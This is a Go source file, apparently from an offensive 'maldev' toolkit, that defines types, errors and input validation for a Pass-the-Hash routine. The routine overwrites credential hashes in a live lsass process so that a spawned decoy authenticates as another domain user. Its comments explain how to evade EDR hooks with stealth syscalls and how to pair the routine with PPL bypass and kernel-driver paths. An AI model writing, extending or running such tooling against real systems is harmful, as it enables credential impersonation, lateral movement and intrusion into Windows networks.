package sekurlsa

import (
	"errors"

	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// Pass-the-Hash write-back into a live lsass — the inverse of the
// extractor stack. Spawns a process under a decoy account, walks
// lsass MSV / Kerberos lists for the spawned process's LUID, and
// overwrites the per-credential hash bytes in place. After the
// process resumes (NtResumeProcess), it authenticates outbound as
// the target principal even though it logged in with the decoy.
//
// MITRE ATT&CK: T1550.002 — Use Alternate Authentication Material:
// Pass the Hash.
//
// Detection level: HIGH. The technique requires:
//
//   - PROCESS_VM_WRITE on lsass.exe (one of the loudest events any
//     EDR watches; route NtWriteVirtualMemory through a stealth
//     *wsyscall.Caller to reduce the user-mode hook surface).
//   - CreateProcessWithLogonW(LOGON_NETCREDENTIALS_ONLY) — visible
//     to process-creation telemetry; the spawned image lineage is
//     atypical for the impersonated user and SHOULD be flagged by
//     mature behavioral rules.
//
// Operationally the technique survives until the impersonated
// principal's credentials rotate (or until the spawned process
// terminates). It does not require admin if the operator owns
// lsass via a prior PPL bypass + token elevation; in practice it
// pairs with credentials/lsassdump.Unprotect / the v0.18.0 BYOVD
// kernel-driver path.
//
// Cross-platform note: types and the pure-Go data manipulation
// (mutateMSVPrimary) live in this file and pth_msv.go. The
// Windows-only Pass / PassImpersonate entry points live in
// pth_windows.go; non-Windows builds do not expose them.

// PTHTarget describes the credentials the spawned process should
// outbound-authenticate as. NTLM is required; AES128/AES256 are
// optional and only needed when the target accepts AES tickets
// (Windows Server 2008 R2+ DCs by default).
type PTHTarget struct {
	// Domain is the FQDN or NetBIOS-style short name of the AD
	// domain the impersonated principal belongs to. Required.
	Domain string

	// Username is the sAMAccountName of the impersonated
	// principal. Required.
	Username string

	// NTLM is the 16-byte MD4 of the impersonated principal's
	// password. Required.
	NTLM []byte

	// AES128 is the 16-byte AES128-CTS-HMAC-SHA1-96 long-term key.
	// Optional — when nil, only NTLM authentication paths work.
	AES128 []byte

	// AES256 is the 32-byte AES256-CTS-HMAC-SHA1-96 long-term key.
	// Optional — same as AES128.
	AES256 []byte
}

// PTHParams configures Pass / PassImpersonate. See pth_windows.go
// for the entry points.
type PTHParams struct {
	// Decoy is the launcher process to spawn under
	// LOGON_NETCREDENTIALS_ONLY. Default cmd.exe.
	Decoy string

	// DecoyArgs is the command-line passed to Decoy. The decoy
	// process is created in CREATE_SUSPENDED so the operator can
	// supply a long-running stub (e.g. a sleep loop) here without
	// racing the LSA writes.
	DecoyArgs string

	// Target is the principal the spawned process will be made to
	// authenticate as. Required.
	Target PTHTarget

	// Caller routes the NtWriteVirtualMemory + NtReadVirtualMemory
	// + NtAllocateVirtualMemory + NtResumeProcess calls through a
	// stealth syscall strategy. Pass nil for the standard ntdll
	// proc-table path; passing a configured *wsyscall.Caller routes
	// through direct/indirect syscalls for EDR-hook evasion. Same
	// convention as the rest of the credentials/* stack.
	Caller *wsyscall.Caller

	// LSAKeyOverride is an optional pre-extracted lsasrv key. When
	// nil, Pass extracts it on the fly from the live lsass via
	// the existing Parse() pipeline (intrusive — opens lsass with
	// PROCESS_VM_READ). Operators with a previously-cached key
	// supply it here to skip the second open.
	LSAKeyOverride *lsaKey
}

// PTHResult is the outcome of a successful Pass / PassImpersonate.
type PTHResult struct {
	// PID of the spawned decoy process — the operator's "handle"
	// to the impersonated session.
	PID uint32

	// LogonID (LUID) of the spawned process's logon session.
	LogonID uint64

	// MSVOverwritten is true when the MSV1_0 LIST_ENTRY for the
	// spawned LUID had its hash bytes successfully overwritten.
	MSVOverwritten bool

	// KerberosOverwritten is true when at least one Kerberos
	// long-term key (NTLM, AES128, AES256) was written into the
	// per-LUID Kerberos session struct.
	KerberosOverwritten bool

	// Warnings collects non-fatal anomalies: missing AES key, no
	// Kerberos session for this LUID, partial overwrite, etc.
	Warnings []string
}

// Sentinel errors. Callers use errors.Is to dispatch.
var (
	// ErrPTHInvalidTarget fires when PTHTarget is missing required
	// fields (Domain / Username / NTLM) or carries malformed
	// hashes (wrong length).
	ErrPTHInvalidTarget = errors.New("sekurlsa: invalid PTH target")

	// ErrPTHSpawnFailed wraps any failure inside
	// CreateProcessWithLogonW or the subsequent token query.
	ErrPTHSpawnFailed = errors.New("sekurlsa: PTH decoy spawn failed")

	// ErrPTHWriteFailed wraps any failure inside the LSA list walk
	// or the NtWriteVirtualMemory overwrite path.
	ErrPTHWriteFailed = errors.New("sekurlsa: PTH lsass write failed")

	// ErrPTHNoMatchingLUID fires when the decoy spawned and got a
	// LUID, but no MSV / Kerberos LIST_ENTRY in lsass matches —
	// usually means the decoy crashed early or LOGON_NETCREDENTIALS_ONLY
	// failed silently.
	ErrPTHNoMatchingLUID = errors.New("sekurlsa: PTH no matching LIST_ENTRY for spawned LUID")
)

// validatePTHParams enforces the contract for both entry points so
// the early-exit on bad input is consistent. Cross-platform: the
// validation is pure data inspection.
func validatePTHParams(p PTHParams) error {
	if p.Target.Domain == "" {
		return errors.Join(ErrPTHInvalidTarget, errors.New("Target.Domain is required"))
	}
	if p.Target.Username == "" {
		return errors.Join(ErrPTHInvalidTarget, errors.New("Target.Username is required"))
	}
	if len(p.Target.NTLM) != 16 {
		return errors.Join(ErrPTHInvalidTarget, errors.New("Target.NTLM must be 16 bytes (MD4 of the password)"))
	}
	if l := len(p.Target.AES128); l != 0 && l != 16 {
		return errors.Join(ErrPTHInvalidTarget, errors.New("Target.AES128 must be empty or 16 bytes"))
	}
	if l := len(p.Target.AES256); l != 0 && l != 32 {
		return errors.Join(ErrPTHInvalidTarget, errors.New("Target.AES256 must be empty or 32 bytes"))
	}
	return nil
}
